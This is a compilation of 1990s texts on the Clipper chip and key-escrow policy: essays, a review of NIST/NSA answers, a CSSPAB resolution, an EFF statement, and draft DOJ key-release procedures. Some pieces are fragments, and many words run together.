the ability to tap thephones of sophisticated criminals. If the Government equips every phone with key escrow: Suppose the Government decided that the wiretap issue is of suchimportance that it would pay to have every phone in the countryequipped with a key escrow capability so that all phone callswould be subject to easy decryption in the case of a wiretap.Most citizens and average criminals would no doubt continue touse the new key escrow phone system in the same way they usephones today, thus remaining subject to wiretaps. However,sophisticated criminals, realizing what is happening, wouldlikely resort to other means (such as super encryption or use ofthe new AT&T devices) to protect their communications on top ofthe key escrow devices, thus exempting themselves from wiretaps.In this scenario, the Government will retain the ability to tapordinary citizens and our average criminals but still lose accessto the communications of the sophisticated criminal (if thislooks repetitive, it is). Or, if the Government outlaws all non-key escrow encryption: Another scenario is the often mentioned case in which theGovernment outlaws all forms of encryption except those that usekey escrow. (Please ignore the civil liberty issues that wouldarise from such an action for this discussion.) Once again mostcitizens, including average criminals, would continue to use thephone system (mostly in the clear with only limited key escrowcapability installed), the same as they do now. These peoplewould continue to be subject to the same level of wiretap astoday. But the sophisticated criminal who is undeterred by usingillegal technology will have no qualms about supplementing his orher telephone security and thus will be able again to escape lawenforcement's wiretap capability. Once again, the result is thesame as for the preceding scenarios. Or, ... others? The reader is encouraged to examine other scenarios. But Ipostulate that all will result in the same conclusion we sawrepeatedly in the above cases: in the future, for those elementswho wish to protect their communications against interception bythe Government or anyone else, there is nothing the Governmentwill be able to do to stop them. Key escrow procedures will notalter this situation. Technology evolves, whether we like it or not The Government, like other elements of society, is subject toshifts in technology, which in some cases bring forth new andwonderful capabilities but at times also eliminate capabilitiespreviously enjoyed.  The laser reader at the grocery checkout allowed grocery chains to run much more efficiently but also took away individual pricing, which many people dearly miss.  The bomber was a terrifying threat until radar allowed improvements to defensive measures. Stealth technology has now shifted that balance again to the offensive. But we don't hear cries to ban stealth technology or to insistthat the other guy put a little reflector on his Stealth planesso our radar can detect them. We accept the shift in technologyfor what it is and do as best we can. The balance of technology has long favored the ability to wiretap communications. With widespread use of private branchexchanges and cryptography, that balance will shift no matterwhat else we might do to attempt to slow it. We must be carefulin our haste to impede this technological shift lest weintroduce expensive and invasive capabilities that do not achievewhat we desire.

APPENDIX B How will key escrow work? The original Clipper announcement indicated that the Initiativewas to be used for telephone-like communications, at least fornow. Many in the computer industry have been concerned about theimpact of a hardware-only key escrow solution on their ability tosupply products employing cryptography. An examination of theinformation supplied to date on key escrow provides a basicunderstanding of how key escrow will work domestically intelephone systems but little insight into its use in computersystems, or internationally. On July 30, 1993, NIST unveiled a draft "Escrowed EncryptionStandard" that describes, often in purposefully vague terms, howa key escrow system will work. It includes a statement ofapplicability for voice, fax, and data limited communicationlevels of up to 14.2 Kbps and below. (For those not intocommunications jargon, that amounts to voice-grade, point-to-point communication links such as when one picks up the phone todial another person or send a fax.) The application of keyescrow to high bandwidth computer communications networks isapparently being left for later documents. The Government has insisted that the encryption being used forkey escrow must be kept secret and only made available inhardware versions that are highly tamper resistant so that thekey escrow measures cannot be subverted or bypassed. First for telephones ... The operation of telephone security devices (such as the AT&T3600 "bump-in-the-wire"), in the absence of key escrow, canreadily be understood. In such devices, the user (typically aperson rather than a computer) places a phone call and, once aconnection has been established with the desired parties, pressesthe "secure" button which initiates the synchronization of bothparties' encryption devices. At this point encryptedcommunication proceeds until either party hangs up or presses the"clear" button. This is approximately how the original AT&T 3600that uses the DES operates. The addition of key escrow to such a device occurs approximatelyas follows. After the "secure" key is pressed and thecryptographic synchronization has taken place, each devicegenerates a special "Law Enforcement Access Field" (LEAF) andexchanges it with the device at the other end of the connection.The LEAF contains, among other things, an encrypted version ofthe device's unique identification number. If a wiretap is in place when the "secure" key is pressed, thewiretap authorities will be able to detect the LEAF and extractthe unique id, which can then be sent to the Government keyescrow agents (two of them are envisioned at present for addedprotection from improper use). Each key escrow agent willreturn his/her instance of the device's unique key in encryptedforms that together will allow the wiretap authority to decryptthe scrambled communications. The equipment that the wiretap authority will need to detect keyescrowed telephone communications and ascertain the targetdevice's unique id will be relatively straight forward. Once itdetects the synchronization exchange between encryption devices,it need only wait until the LEAF is sent to pick up the device'sID. How will the exchange with the key escrow agents take place? How the actual exchange between the law enforcement authority andthe two key escrow agents will occur has not been publicly stated(at least as of this writing1). The escrow agent must determinethat the law enforcement authority has a valid wiretap courtorder even though he or she must not be told whom the wiretap isfor or to whom the device ID belongs. The exchange between thewiretapper and the two key escrow agents must happen quicklybecause real-time taps of urgent phone calls may be taking place. Under these circumstances, it is difficult to comprehend whatparticularly critical role the escrow agent is performing sincehe or she has virtually no information on which to base adecision to send the device's unique key to the wiretapper. Itis also difficult to see how the audit trail that each escrowagent must keep will be of any value in detecting misuse of thesystem since all it contains is the fact that a requested key wasreturned to a particular wiretap authority at a particular time. How many intercept devices there will be has not yet beendetermined. One per law enforcement jurisdiction seems too many,one per locality having wiretaps last year doesn't seem right,and a few stockpiled in Washington with the key escrow agentsfeels wrong. And who will pay for all of this? How much the key escrow service will cost and who will pay for ithave not yet been determined either. Presumably, the Governmentwill pay for the costs of acquiring, storing, cataloging, andaccessing escrow keys, though it may seek an increase in theFederal excise tax on phone use to fund it. The user will haveto pay for the device (unless the scenario in which theGovernment pays for everything comes about). The price of theAT&T devices today is approximately $1200 each. Presumably, theClipper version of the AT&T device will not cost the consumer anymore (even though because of the extra Clipper chip it will costAT&T more to make). But unless the Clipper version is actuallylower in price than the non-key escrow devices, it is difficultto see why a consumer will choose the key escrow version overthe ordinary one. It also remains to be seen how many people arewilling to pay extra (even if the price drops by a factor of ten)for any form of telephone security. ... and then for computer communications? Typically, computer-to-computer communications such as electronicmail do not involve a time synchronization between the sender andthe receiver. One can originate mail that takes minutes or hoursto deliver, and the receiver can take days to get around toreading it. So the equivalent of one user pressing the "secure"button to synchronize the encryption devices with the receiverdoes not exist. Today's electronic mail security services typically use a pseudorandom number to encrypt the text of the message to be sent andthen encrypt that message key using the receiver's public key toprotect it during transmission and send it along with theencrypted message. The receiver's process looks up his or herprivate key, decrypts the message key, and then decrypts themessage itself. It would be possible to have the originatingprocess generate a LEAF and send it along with the message sothat any wiretap could identify the unique ID of the sender.This would, of course, require a LEAF for every message sent. Is hardware-only encryption feasible? The Government has stated a firm requirement that the encryptionprocess must be performed in hardware to protect the integrity ofthe encryption itself and the resulting LEAF. Clearly thatportion of the system that does the encryption can be implementedin a hardware device or smart card or PCMCIA card. Theelectronic mail (or other) application system itself will at somelevel be implemented in software on a host computer, personalcomputer, or workstation. That software, while it probablycannot compromise the hardware, can certainly bypass it, leavingout or modifying the LEAF. Such action could result inunsuccessful decryption by the receiver's hardware device. But there are several scenarios in which groups of people whowant to defeat the key escrow process will certainly be able todo so. The first case involves using another software encryptionprocess (such as Pretty Good Privacy [PGP] or Privacy EnhancedMail [PEM]) to superencrypt the message before sending it to thekey escrow encryption hardware. The message would have alegitimate LEAF and be fully compliant with the latest version ofthe Escrowed Encryption Standard. But if the law enforcementauthorities ever try to decrypt it, they will find thesuperencrypted message underneath. A second approach at defeating the escrow process would be forthe software that processes the message after it has beenencrypted by the key escrow hardware to save the LEAF and modifythe one that is contained in the message so that it looks okay.The real LEAF could be forwarded in parts in other portions ofthe communications protocols so that the receiving system couldreconstruct the proper LEAF, reinsert it in the message, and sendthe message to the key escrow decryption hardware. Any lawenforcement use would, of course, be thwarted by the improperLEAF. A third approach would be to just encrypt the message after ithas been through the key escrow hardware so that the message,LEAF and all, would be encrypted. Of course, if one is going todo this, one would not bother with the key escrow hardware in thefirst place. The point of all this is that truly hardware-only implementationsof key escrow techniques are not possible in computerapplications. Within a very short time after the introduction ofkey escrow systems, software patches for most popular applicationprograms to defeat key escrow without detection (until a wiretapis attempted) will be available on free software bulletin boardseverywhere. Anyone who wants to protect their communicationsfrom wiretap can do so easily without detection. Even if theGovernment were to mandate the use of key escrow hardware, onecan quickly expect software implementations that look like thehardware output (but won't work on a wiretap) to crop up just tosave the extra cost of purchasing the hardware. Interception complexity The problems for the interceptor are considerably more difficultthan in the telephone case. First of all, the wiretap mustcapture all of the data being sent to be effective. This will beokay if the direct link to the user's computer is tapped, butmuch more difficult if only one of the many links in the widearea network over which the user's data is sent can be tapped,since only portions of the communications may be intercepted. The interceptor's device must understand all of the computerprotocols up to and including the specific electronic mail orother application protocol to be able to find the LEAF in themaze of protocol layers. Given today's sophisticated protocolhandling devices, building such an interception tool is notconsidered a technological challenge, but a general purpose toolcapable of intercepting LEAFs in a wide variety of applicationlayer protocol streams will be considerably more complex than thesimple telephone interception device. Legal side of broad network wiretaps? It is also worthy of some legal scholar's review to determine ifthe provisions in the wiretap statute that require minimizationof the intercept of traffic other than that associated with theactual wiretap target will render blanket searches of wide areanetwork links illegal. It certainly will be hard to avoidexamining massive quantities of information that have absolutelynothing to do with the wiretap target in such a search. All of these concerns taken together make it clear thatimplementing key escrow encryption in the large number ofexisting and future applications for computer communications willbe a much more difficult task than that envisioned for telephonesystems. And who will pay? Once again, presumably the Government will pay for theinterception costs, but the user will have to pay for the actualhardware devices that are employed. The cost of $25 per chiptranslates into $100 per device, once it is packaged anddocumented for end user installation. If one envisions 10 millionsuch devices put into operation in the next few years, thatamounts to $1 billion in extra cost to the user community. Thiscost must be weighed against the essentially free softwarepackages that are available. And for what capability? But does the FBI really need to obtain computer traffic bywiretap? In all the comments I have seen to date, no one has indicatedthat the law enforcement community needs wiretaps to obtaincomputer communications. Most computer systems have automaticbackup capabilities that keep archive copies of all files in caseof equipment failures. Law enforcement authorities can obtaincopies of electronic mail or other computer files throughtraditional search warrant procedures instead of resorting todifficult-to-obtain wiretaps. A counter argument might be thatsearches yield historical data while wiretaps yield real-timedata. But until there is a demonstrated need for a capability,we must not use the possibility that we might want something asthe excuse to pursue a path that is contrary to technologicalevolution.

I am reminded of a story, perhaps apocryphal. In the middle seventiesFortune magazine was working a feature on computer crime. Most of theexperts that they interviewed told them that the security on most of thenation's commercial time sharing systems was pretty good. However, theyadmitted that one convicted felon and hacker, Jerry Schnieder, wouldtell them otherwise. Of course Fortune had to interview him. Accordingto the story, the interview went something like this: Fortune: Mr. Schnieder we understand that you are very critical of thesecurity on the nation's commercial time sharing systems. Jerry: Yes, that is right. Their security is very poor. Fortune: Could you break into one of those systems? Jerry: Yes, certainly. Fortune: Well, could you demonstrate for us? Jerry: Certainly, I'd be happy to. At this point Jerry took the reporters into the room where his "Silent700" terminal was. He connected to the system that he normally used butdeliberately failed the logon. When he deliberately failed again at theretry prompt, the system disconnected. Jerry dialed in again, failed athird time, and this time he broke the connection. He dialed a thirdtime but this time he dialed the number of the operator. Jerry: This is Mr. Schnieder. I seem to have forgotten my password.Can you help me? Operator: Sorry Mr. Schnieder, there is nothing that I can do. Youwill have to call back during normal business hours and talk to thesecurity people. Jerry: I am sorry too, but you do not seem to understand. I am workingon something very important and it is due out at 8am. I have to get onright now. Operator: I am sorry. There is nothing that I can do. Jerry: You still do not understand. Let me see if can clarify it foryou. I want you to go look at your billing records. You will see thatyou bill me about $800- a month. This thing that I am working on; it iswhy you get your $800-. Now, if you do not get off your a-- and get memy password so that I have this work out at 8am, by 9am there is going tobe a process server standing on your front steps waiting to hang paperon the first officer through the door. Do I make myself clear? Apparently he did. Operator: Mr. Schnieder, I will call you right back. At this point he appears to have one or two things right. He changedthe password, called Jerry back at the number where his records saidthat he should be, and gave him the new password. Jerry dumped twofiles and then turned to the reporters. With a triumphant smile he said"You see!" Fortune (obviously disappointed): No, No, Mr. Schneider! That is notwhat we wanted to see. What we wanted to see was a sophisticatedpenetration of the software controls. Jerry: Why would anybody do THAT? __________________________ The cost of an exhaustive attack is an interesting number. It gives usan upper bound for the cost of efficient attacks. However, it is never,itself, an efficient attack. It is almost always orders of magnitudehigher than the cost of alternative attacks. The very fact that itscost can be easily calculated ensures that no one will ever encrypt dataunder it whose value approaches the cost of a brute force attack. History is very clear. "Black Bag" attacks are to be preferred; theyare almost always cheaper than the alternatives. After those areattacks aimed against poor key management. These attacks will be veryefficient when the keepers of the keys already work for youand where their continued cooperation and silence are assured.

Detweiler" <ld231782@longs.lance.colostate.edu> An EFF Online newsletter previously reported highlights from a list ofquestions submitted to the NIST/NSA regarding Clipper. That entiredocument is now available on ftp.eff.org inpub/EFF/legislation/clipper-answers. It makes reference to attachmentson chip specifications that are not present in the text file. Overall,the document has rather numerous typographical errors for a governmentdocument, and it's unclear whether this is the result of the EFFscanning or whether they are in the original document. Also, at thispoint in the swift-moving arena, the responses are fairly dated, comingout long before the close of the expert review of the algorithm and aCSSPAB meeting at the end of July. Items in this review of the Clipper comments: - encryption regulation- constitutionality- Mycotronx, VLSI rationale, history of Clipper- Presidential directive & review procedure- key escrow in software- history of Skipjack- identification information in key escrow databases- notes on wiretap protocol- NSA cryptographic control wish list- Capstone capabilities- policy review- Clipper: a status report Encryption Regulation--- The major revelation in this document as reported here previously isthe statement that the Administration has progressed far enough in the`policy review' to determine that `regulating private encryption' wouldbe `imprudent' and `drastic' and that no new legilsation will beproposed to `limituse of encryption technology'. Unfortunately, in thecharacteristically maddening bureacratic doublespeak of the NSA, theprevious statements suggest that this is the case only `because thesemeasures may be sufficient to make key escrow encryption [widespread]'.Nevertheless the statement is extremely significant given variousominous sound bites in the media that suggested very clearly thatcryptographic regulation was definitely `on the table' for consideration. Constitutionality--- The other major revelations as reported in the EFF document are theexplicit attention to constitutional issues. However, the response isnot very meaningful except to deny that any are relevant. Inparticular, it does not indicate the constitutionality of anyenforcement or regulation in the area. >The key escrow technology only ensures that government agencies, will be>able to decrypt intercepted communications when lawfully authorized. It>neither expands nor contracts federal, state or local law enforcement>authority to access and decrypt communications. The key escrow technology>simply assures the continued feasibility of lawful electronic surveillance>under statutes that have long since been determined to be constitutional. Mostly the document is just a reformulation of the following idea invarious ways: >it became clear>that a strategy was needed that could accommodate the needs of the private>sector for top notch communications security; of U.S. industry to remain>competitive in the world's secure communications market; and of U.S. law>enforcement to conduct lawfully-authorized electronic surveillance. Clearly, the writers' favorite words are `authorized' and `lawful' andhere we are doubly reassured. Mycotronx, VLSI--- Here are a few other significant details in the response. For the firsttime there is official confirmation that the proposal goes back farprevious to the Clinton administration: >The logic design contract for the microcircuit was awarded to MYKOTRONIX,>Inc. of Torrance, California, in late 1991 Mykotronx was chosen because: >This company provided a>unique combination of (i) expertise to quickly design custom cryptographic>chips, (ii) secure facilities, and (iii) the cleared personnel (At the TOP>SECRET level) necessary for the successful execution of the contract>requirements. Which makes me wonder. Has anyone with any serious sway in the NSAnoticed the stolen Mycotronx documents yet? I would love to see theresponse to an FOIA inquiry on this one. Do they care? Did any headsroll at Mycotronx? >VLSI Technology of San Jose, California, was chosen as the chip foundry>based primarily on its technological capabilities to fabricate>microcircuits resistant to reverse engineering Selection of the vendors was>in accordance with U.S. government rules for sole source procurement.>other manufacturers that wish to enter the market and can satisfy the>technology and security requirements will be approved to manufacture these>microcircuits. Here we have the highly implausible suggestion that other companieswill be considered to manufacture the microcircuits. Fat chance. Presidential Directive--- The document gives more detail about the Presidential Review Directiveand Presidential Decision Directive behind Clipper. >The PRD called for interagency studies examining a number>of issues including, for example, the impact of the key escrow strategy and>the feasibility of implementing the key escrow technique in software.>Another issue to be addressed in the course of the review is the impact of>advanced telecommunications on law enforcement. While analogous in the>sense that both encryption and advanced telecommunications technology can>impede the effectiveness of authorized law enforcement electronic>surveillance, the two technologies present different issues and are being>treated separately. The results of the reviews are expected early this>fall. Hence, the `feasibility of implementing the key escrow technique insoftware' is `under review.' Later in the document, we have the point: >Because software is easy to change, secure software implementations of the>key escrow technique have been difficult to devise. We would welcome the>participation of the software industry in a cooperative effort to meet this>technical challenge. of course, users may continue to use existing>software encryption products. I don't recommend cooperating with the NSA in trying to devise `securesoftware' -- first of all, the suggestion that they will even have`security' in chip hardware is a fantasy and illusion; secondly,software is inherently free and unchained and nothing the NSA inventscan ever change that; thirdly, cooperating with the NSA can behazardous to one's economic health; and finally, probably no one in theNSA seriously believes that secure software implementations arepossible, and are just throwing this out for cynical effect. Skipjack--- Information on SKIPJACK, confirming suggestions by some (e.g. A. Walkeron sci.crypt) that the algorithm is based on earlier defense-orientedschemes in a long line of development: >Was the encryption algorithm specifically designed for the key escrow>initiative?>>No. The algorithm chosen for the key escrow microcircuit was originally>developed by NSA for use in U.S. government communications systems, albeit>not in the management of our nuclear arsenal as some have speculated.>Essentially the same cryptographic technology was under government>development and analysis for more than ten years. Although NSA does not>comment on the details of its design and analysis, the algorithm has>undergone intense expert scrutiny comparable to that used in the analysis>of cryptography intended for classified government systems. While the>algorithm was originally developed for unclassified defense systems, it>will be considered for certain classified applications in the future. Key Escrow Databases--- What about identification associated with keys in the databases? TheNSA is in a catch-22 here. If there is nothing but serial numbers in adatabase, how do the key escrow agencies ensure that key IDs requestedfor wiretapping are associated with the given entities named inwarrants? If they are present, how could such a scheme be maintained inanything other than an Orwellian Totalitarian Dystopia? The followingis the first explicit commitment to total lack of identificationinformation in the databases: >Some have expressed concerns that personal information could be contained>in the key escrow databases. The only information held by a key escrow>agent will be the chip serial numbers and the key component associated with>that number. Since the information in the key escrow databases will not be>associated with any particular individual, the database would be of no use>in identifying individuals or otherwise obtaining personal information>about them. Therefore, a key escrow agent will have no information about>the person owning or using equipment containing a microcircuit for which it>holds keys. Requests for a key component will be for a particular chip>identification number. No information regarding the identity of the target>of the authorized electronic surveillance will be provided to the key>escrow agents. Wiretap Protocol--- Interestingly, they say that when a wiretapped device is moved to a newphone number, they don't have the authority to tap it any longer: >If the subject of A surveillance were to move the device to another>location (and another telephone number), law enforcement authorities could>not legally monitor communications at other locations. This is because, as>noted above, electronic surveillance of wire or electronic communications>must be directed at some identifiable telephone, cellular telephone, or>computer facility. Therefore, before law enforcement authorities can>legally monitor any other telephone number in an effort to locate the>subject's encryption device, they must first satisfy a court that there is>probable cause to believe that illegal communications will occur over that>line. Major criticism is based on the fact that once a given key has beenreleased, a phone is forever in the future insecure. For the first timewe have the assurance >As added protection, law enforcement will have access to a key only so long>as it has authority to conduct a surveillance. Systems are being designed>to ensure that keys are destroyed when the authority to conduct a>particular electronic surveillance has expired. NSA wish list--- We get a wish list of realms in which the NSA would like to controldomestic cryptography: >Concerns have been expressed about use of this key escrow technology and>these chips, in particular, across the panoply of new emerging>technologies, such as ISDN, TDMA, Cellular, CDMA Cellular, ATM, SONET,>SMDS, etc. Don't forget PEM -- D.D. gets really excited about that one. >It impossible to design key escrow encryption techniques that>are almost totally transparent to the system, given the transmission media>together with its propagation characteristics. Optimally, the system>should be designed with the encryption, if possible. The government intends>to work cooperatively with industry toward this end. Yes, just what every cryptography company wants, their personal NSAconsultant breathing down their circuits. Capstone Capabilities--- Here's some notes on Capstone. Most capabilities also indicated by D.D.in her writings: >In addition to the key escrow technology contained in the>encryption-only chip, the enhanced chip also includes a Digital Signature>Algorithm proposed by NIST as a FIPS; a Secure Hashing Algorithm (SHA)>recently approved as FIPS 180; a Key Exchange Algorithm based on a public>key exchange, a general purpose exponentiation algorithm; and a general>purpose, random number generator which uses a pure noise source. This chip>is now being considered for installation in PCMCIA electronic cards and for>use in the Defense Messaging System. Personally, I wonder if the NSA intends to phase out Clipper from thebeginning. The implementation could encrypt the law enforcement fieldunder that more low-level chip. The Capstone chip will be the NSA'slittle `black box' miracle in every machine. Policy Review--- Finally, there are the indications that the `policy review' done in theFall will cover the exportability of key escrow and the futurecryptographic export control policy in the country concerning`marketability and foreign competition'. While everyone is desperatefor a breakthrough here, the likely announcement will be that `noexport restrictions will be placed on Clipper' and since the technologyis completely suitable for all cryptographic applications (smirk) noother cryptographic devices will be approved for export. That's my guess,anyway. Clipper: a status report--- Current progress report on Clipper: the most serious hurdles for theNSA right now are imposing the Clipper FIPS standard and the DSA patentarrangement with PKP. The NSA has long demonstrated its completeobliviousness and imperviousness to public opinion no matter how loudor negative (consider early DSS endorsement). However, for the previoustwo standards, it has reached unprecedentedly screeching levels. Thegovernment will find it *extremely* difficult to go ahead with eitherin the face of almost uniformly hostile reception to both. Doing so islikely to raise a much larger outcry and warrant more desperateapproaches on the side of the opposition (ala Zimmermann's `guerillacryptography'). The future revelations in the DSS, Clipper, and `policy review' topicswill be critical in indicating whether the NSA will take a more low-keyand unobtrusive stance in regulation of domestic cryptography, with theoriginal Clipper announcment its boldest step ever, or whether it willbecome even more paranoid and volatile in attempting to control andstrangle natural, evolving domestic cryptographic developments. If youvalue your freedom, pray for the former.

Attachments - ------------------------ NON-CERTIFIED TEXT COMPUTER SYSTEM SECURITY AND PRIVACY ADVISORY BOARD RESOLUTION 93-5 September 1-2, 1993 Subsequent to the June 2-4, 1993 meeting of the CSSPAB, the Boardhas held an additional 4 days of public hearings and hascollected additional public input. The clear message is that the preliminary concerns stated inResolution 1 of that date have been confirmed as serious concernswhich need to be resolved. Public input has heightened the concerns of the Board to thefollowing issues: - A convincing statement of the problem that Clipper attempts to solve has not been provided. - Export and import controls over cryptographic products must be reviewed. Based upon data compiled from U.S. and international vendors, current controls are negatively impacting U.S. competitiveness in the world market and are not inhibiting the foreign production and use of cryptography (DES and RSA). - The Clipper/Capstone proposal does not address the needs of the software industry, which is a critical and significant component of the National Information Infrastructure and the U.S. economy. - Additional DES encryption alternatives and key management alternatives should be considered since there is a significant installed base. - The individuals reviewing the Skipjack algorithm and key management system must be given an appropriate time period and environment in which to perform a thorough review. This review must address the escrow protocol and chip implementation as well as the algorithm itself. - Sufficient information must be provided on the proposed key escrow scheme to allow it to be fully understood by the general public. - Further development and consideration of alternatives to the key escrow scheme need to be considered, e.g., three "escrow" entities, one of which is a non- government agency, and a software based solution. - The economic implications for the Clipper/Capstone proposal have not been examined. These costs go beyond the vendor cost of the chip and include such factors as customer installation, maintenance, administration, chip replacement, integration and interfacing, government escrow system costs, etc. - Legal issues raised by the proposal must be reviewed. - Congress, as well as the Administration, should play a role in the conduct and approval of the results of the review. Moreover, the following are additional concerns of the Board: - Implementation of the Clipper initiative may negatively impact the availability of cost-effective security products to the U.S. Government and the private sector; and - Clipper products may not be marketable or usable worldwide.

We, therefore, endorse theprocess being pursued by the administration in the form of aninteragency review but believe the scope of that review needs toinclude adequate industry input. We reaffirm our recommendation(of March 1992) that the issues surrounding this policy bedebated in a public forum. In view of the worldwide significanceof these issues the Board believes that the Congress of the U.S.must be involved in the establishment of cryptographic policy. The Board, furthermore, believes that there are a number ofissues that must be resolved before any new or additionalcryptographic solution is approved as a U.S. government standard: 1. The protection of law enforcement and national security interests; 2. The protection of U.S. computer and telecommunication interests in the international marketplace; and 3.

For the role that EFF has had in furthering this,we apologize. The squabbling, which we recognize as being as much personalas political, distracts us all from the important policy issues we face. EFF has always worked hard to ensure that Congress does not pass laws thatlimit the public's ability to access government information, and we believethat our track record proves our dedication to this issue. o We lobbied for language in the new OMB A-130 Circular that givesgovernment an affirmative responsibility to disseminate public information. o We worked to draft and seek passage of an Electronic Freedom ofInformation Act and are working to get government agencies to comply withelectronic records requests under the current FOIA. o We were part of a coalition that opposed a bill designed to givegovernment copyrights on information. o We opposed the charging of fees on a government-run electronicbulletin board system. o We have worked to make sure that the bill reauthorizing thePaperwork Reduction Act includes sections requiring the affirmativedissemination of public information in electronic formats at the marginalcost of dissemination. o We made calls on behalf of passage of the GPO WINDO bill. o We are working on a soon-to-be-released proposal for governmentfunding of agency dissemination projects as part of the NationalInformation Infrastructure (NII). The proposal includes set-asides fornonprofit organizations. EFF will continue to fight for the passage of good laws that makegovernment information easily available to the public. We undoubtedly willnot always see things the same as other organizations, or the same as ourfunders or members, but we will always remain dedicated to advancing thiscause. We are currently putting together a paper that explains EFF'sright-to-know policy. This should help to articulate our stance on thisimportant issue.

Here is an account of anAdministration hill staff briefing on September 16, 1993 and the draftprocedures for law enforcement, foreign intelligence, and state and locallaw enforcement wiretapping. We are looking for comments and analysis.Please circulate widely. Jerry Berman, EFF. ================== RE: Clipper Escrow Agent Briefing for Congressional Staff Yesterday, September 15, 1993, a briefing was held for congressional staff regarding the status of theClipper project. The lead briefers for the Administration were MarkRichard, Deputy Assistant Attorney General, Criminal Division, DOJ; JimKallstrom, FBI; Geoff Greiveldinger, Special Counsel, Narcotic and DangerousDrug Section, DOJ; and John Podesta. Also present were Mary Lawton,Counsel for Intelligence Policy and Review, DOJ; Mike Waguespack, NSC;and Dwight Price, National District Attorneys Association. The Administration has tentatively settled on NIST and a yet to bedetermined non-law enforcement component of the Department of theTreasury as the "escrow agents." The Administration will finalize thechoices in the next few days, according to John Podesta. The AttorneyGeneral will make an announcement, in what form has not beendetermined, but it will probably not be a Federal Register notice. TheAttorney General will announce that she has adopted, and the escrowshave agreed to follow, the attached procedures. The system will work as follows: (1) A black box (actually a PC) in the possession of a law enforcementagency will be able to read the Law Enforcement Access Field in aClipper encrypted data stream and extract the identification numberspecific to the Clipper chip being used by the intercept target. Cost ofthe black box yet undetermined. How many will be purchased bylaw enforcement yet undetermined, although if use of Clipperbecomes common, the black boxes will be in great demand, byfederal as well as state and local agencies. They will be availableonly to law enforcement, with yet to be specified controls on theirsale. Each black box will have a unique identifier. (2) The law enforcement agency will fax the device ID number toeach of the escrow agents, along with a certification that the agencyhas authority to conduct the intercept, the ID number of theintercepting agency's black box, and the time period for which theintercept is authorized (in the case of Title III's, up to thirty days,with extensions). (3) The escrow agents will transmit the key components byencrypted link directly into the black box of the requesting lawenforcement agency. The key components will only work with thatparticular black box, and will only work for the stated duration ofthe intercept. If the intercept is extended, the law enforcementagency will have to send a new request to the escrow agents toextend the life of the key components. The escrow agents will maintain logs of the requests. Greiveldingerstressed that the system is "replete with recordation of the transactionsthat will occur." The escrow agents also have a responsibility formaintaining the integrity of the chip manufacturing process. In opening remarks describing the need for the Clipper escrowsystem, Kallstrom had stressed that the AT&T product posed a uniquethreat in terms of voice quality, affordability, portability and strength ofthe encryption. The Administration rejects the argument that voiceencryption is readily available. The AT&T product, which isn't availableyet, is unique, and competing products, the Administration argues, are yetfurther in the future. The next voice encryption product in the pipeline is Motorola's, andMotorola has expressed interest in using Clipper in its product. TheAdministration argued that the need for compatibility would drive asignificant share of the market to Clipper or Capstone-based products.Escrow coverage will not be complete, but the bad guys are careless andare expected to use Clipper products. The key criterion used in selecting the escrow agents was whetherthe agency had experience in and an infrastructure for handling sensitiveinformation. The Administration did not want to use a law enforcement ornational security component, for credibility reasons. It did not want to useprivate entities based on concerns about longevity and not wantingsecurity to be governed by the need to make a profit. The briefers admitted that the proposed system is not really anescrow. The agencies holding the key components will not have any dutiesor responsibilities to the Clipper users. The escrows' obligation will be tothe government, and they will be liable to Clipper users only under theBivens doctrine, where any failure must be shown to be wilful. Both John Podesta and Mark Richard stated that there is no plan onor over the horizon to outlaw non-escrowed encryption. John and Mark said that the international aspects of theescrow/encryption issue are the thorniest to deal with, and there are noanswers yet. Clipper products would be exportable with a license,although other countries may try to keep them out. (Nobody askedquestions about changes in the rules governing export of non-Clipperencryption.) Other nations would not participate in the escrow system,nor, presumably, would they be allowed to buy the black boxes. E.G., if theBritish intercepted an IRA communication that appeared to be encryptedwith Clipper, and came to the FBI for help, the anticipated escrow systemwould not allow the FBI to get the key from the escrow agents. ==================PROPOSED PROCEDURES AUTHORIZATION PROCEDURES FOR RELEASE OF ENCRYPTION KEY COMPONENTSIN CONJUNCTION WITH INTERCEPTS PURSUANT TO TITLE III The following are the procedures for the release of escrowed keycomponents in conjunction with lawfully authorized interceptionof communications encrypted with a key-escrow encryption method.These procedures cover all electronic surveillance conductedpursuant to Title III of the omnibus Crime Control and SafeStreets Act of 1968, as amended (Title III), Title 18, UnitedStates Code, Section 2510 et seq. 1) In each case there shall be a legal authorization forthe interception of wire and/or electroniccommunications. 2) All electronic surveillance court orders under TitleIII shall contain provisions authorizing after-the-factminimization, pursuant to 18 U.S.C. 2518(5), permittingthe interception and retention of coded communications,including encrypted communications. 3) In the event that federal law enforcement agentsdiscover during the course of any lawfully authorizedinterception that communications encrypted with a keyescrow encryption method are being utilized, they mayobtain a certification from the investigative agencyconducting the investigation, or the Attorney Generalof the United States or designee thereof. Suchcertification shall (a) identify the law enforcement agency or otherauthority conducting the interception and the personproviding the certification;(b) certify that necessary legal authorization has beenobtained to conduct electronic surveillance regardingthese communications;(c) specify the termination date of the period forwhich interception has been authorized;(d) identify by docket number or other suitable methodof specification the source of the authorization;(e) certify that communications covered by thatauthorization are being encrypted with a key-escrowencryption method;(f) specify the identifier (ID) number of the keyescrow encryption chip providing such encryption; and(g) specify the serial (ID) number of the key-escrowdecryption device that will be used by the lawenforcement agency or other authority for decryption ofthe intercepted communications. 4) The agency conducting the interception shallsubmit this certification to each of thedesignated key component escrow agents. If thecertification has been provided by aninvestigative agency, as soon thereafter aspracticable, an attorney associated with theUnited States Attorney's Office supervising theinvestigation shall provide each of the keycomponent escrow agents with writtenconfirmation of the certification. 5) Upon receiving the certification from therequesting investigative agency, each keycomponent escrow agent shall release thenecessary key component to the requestingagency. The key components shall be provided ina manner that assures they cannot be used otherthan in conjunction with the lawfullyauthorized electronic surveillance for whichthey were requested. 6) Each of the key component escrow agents shallretain a copy of the certification of therequesting agency, as well as the subsequentconfirmation of the United States Attorney'soffice. In addition, the requesting agencyshall retain a copy of the certification andprovide copies to the following: (a) the United States Attorney's officesupervising the investigation, and(b) the Department of Justice, Office ofEnforcement operations . 7) Upon, or prior to, completion of the electronicsurveillance phase of the investigation, the ability ofthe requesting agency to decrypt interceptedcommunications shall terminate, and the requesting agencymay not retain the key components. These procedures do not create, and are not intended to create,any substantive rights for individuals intercepted throughelectronic surveillance, and noncompliance with these proceduresshall not provide the basis for any motion to suppress or otherobjection to the introduction of electronic surveillance evidencelawfully acquired. AUTHORIZATION PROCEDURES FOR RELEASE OF ENCRYPTION KEY COMPONENTSIN CONJUNCTION WITH INTERCEPTS PURSUANT TO FISA The following are the procedures for the release of escrowed keycomponents in conjunction with lawfully authorized interceptionof communications encrypted 